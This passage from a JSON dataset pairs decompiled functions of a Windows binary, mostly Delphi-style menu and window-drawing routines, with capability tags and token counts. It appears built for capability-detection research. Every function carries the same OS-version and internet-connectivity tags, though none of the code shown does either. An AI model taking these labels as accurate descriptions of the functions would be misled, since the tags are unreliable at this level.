0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.00436520();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.00436510();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.00436520();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.00436520();\n                    cVar1 = fcn.004375c0();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.00436520();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 829
    },
    "0043773c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0043773c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0043773c();\n        uVar1 = *((uVar1 & 0x7f) + 0x490418);\n    }\n    return *((uVar1 & 0x7f) + 0x49041c);\n}\n",
        "token_count": 137
    },
    "0043776c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0043776c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0043776c();\n        uVar1 = *((uVar1 & 0x7f) + 0x490418);\n    }\n    return *((uVar1 & 0x7f) + 0x49041c);\n}\n",
        "token_count": 137
    },
    "0043779c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0043779c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.00434390();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00404620();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4382dc;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041ff44();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.0043874c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 358
    },
    "004378fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004378fc(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.00436510();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.00436520();\n                cVar1 = fcn.004378fc(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 365
    },
    "004379c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004379c4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00438f68();\n    }\n    else {\n        for (iVar2 = fcn.00437994(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 239
    },
    "00437b18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437b18(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "00437d6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.00437d6c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x437d9a;\n        var_1h._0_1_ = fcn.00437d6c(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.00437994();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.00437d5c();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x437e92;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.00436a3c();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 658
    },
    "00437ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437ec0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x437ed4;\n    cVar1 = fcn.00437cd0();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x437ee3;\n    fcn.00437d0c();\n    puStack36 = 0x437efd;\n    fcn.0042cd30();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x437f93;\n    puStack48 = 0x437f1d;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.00437994();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x437f9a;\n        uStack40 = 0x437f92;\n        uVar3 = fcn.0042cd28();\n        return uVar3;\n    }\n    puStack48 = 0x437f33;\n    fcn.0042cd30();\n    uStack52 = 0x437f68;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00437d6c(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x437f6f;\n    uStack52 = 0x437f67;\n    uVar3 = fcn.0042cd28();\n    return uVar3;\n}\n",
        "token_count": 454
    },
    "00437fbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437fbc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x437fe3;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.00438350();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.00438350();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "00438124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00438124(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.00438078(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.004059dc();\n        iVar1 = fcn.0040a960();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.004057a0();\n    return 1;\n}\n",
        "token_count": 173
    },
    "004381b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004381b8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x4927e0 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x43822c;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.00438728();\n        }\n        else {\n            fcn.00438728();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x438233;\n        uStack20 = 0x438221;\n        fcn.00438728();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "00438238": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438238(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.00438124();\n    if ((*(*0x4927e0 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.004381b8();\n        }\n        else {\n            fcn.0043874c();\n        }\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00438350": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00438350(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00438504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438504(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.00438368(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.004383c4(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00438680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00438680(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00437b18();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.00437994();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.00437994();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.0040a940();\n            uVar4 = fcn.0040a858();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 275
    },
    "0043874c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043874c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0044d264();\n        if (iVar1 != 0) {\n            fcn.00438728();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00438774": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438774(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.00404800();\n        fcn.00438728();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00438808": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438808(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.00438124();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.004382a0(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 173
    },
    "00438924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438924(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x438e58;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x4389a2;\n                    fcn.00419888();\n                    puStack80 = 0x4389ab;\n                    cVar3 = fcn.00437a34();\n                    if (cVar3 != '\\0') goto code_r0x00438e42;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438bb6;\n                    fcn.00419888();\n                    puStack80 = 0x438bc3;\n                    iVar5 = fcn.00437994();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x438bdc;\n                        fcn.00425088();\n                        puStack84 = 0x438c8b;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x438bf9;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x438c6e;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.0042571c();\n                        fcn.004255b0();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x438c46;\n                        fcn.0043911c(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x438c75;\n                        uStack104 = 0x438c5d;\n                        fcn.0042571c();\n                        puStack112 = 0x438c6d;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438cc1;\n                    fcn.00419888();\n                    puStack80 = 0x438cce;\n                    piVar4 = fcn.00437994();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x438ce7;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x438dce;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x438d04;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.00425088();\n                        uStack100 = 0x438da9;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x438d1e;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x438d8c;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.0042571c();\n                        fcn.004255b0();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x438d93;\n                        uStack120 = 0x438d7e;\n                        fcn.0042571c();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438ab4;\n                    piVar4 = fcn.00419888();\n                    puStack80 = 0x438ab9;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x438acb;\n                        iVar5 = fcn.00419888();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x438add;\n                        fcn.00419888();\n                        puStack80 = 0x438aea;\n                        *NULL = fcn.00437994();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x438b01;\n                        fcn.00419888();\n                        puStack80 = 0x438b0e;\n                        iVar9 = fcn.004379c4();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x438b1c;\n                            fcn.00419888();\n                            puStack80 = 0x438b29;\n                            fcn.004379c4();\n                        }\n                        if (*(**0x4927b4 + 0x6c) != 0) {\n                            if ((*(*(**0x4927b4 + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x438b82;\n                                fcn.00446c7c();\n                            }\n                            else {\n                                puStack80 = 0x438b6f;\n                                fcn.00446d04();\n                            }\n                        }\n                        goto code_r0x00438e42;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x4389d8;\n                fcn.00419888();\n                puStack80 = 0x4389e0;\n                cVar3 = fcn.00437a50();\n                if (cVar3 != '\\0') goto code_r0x00438e42;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 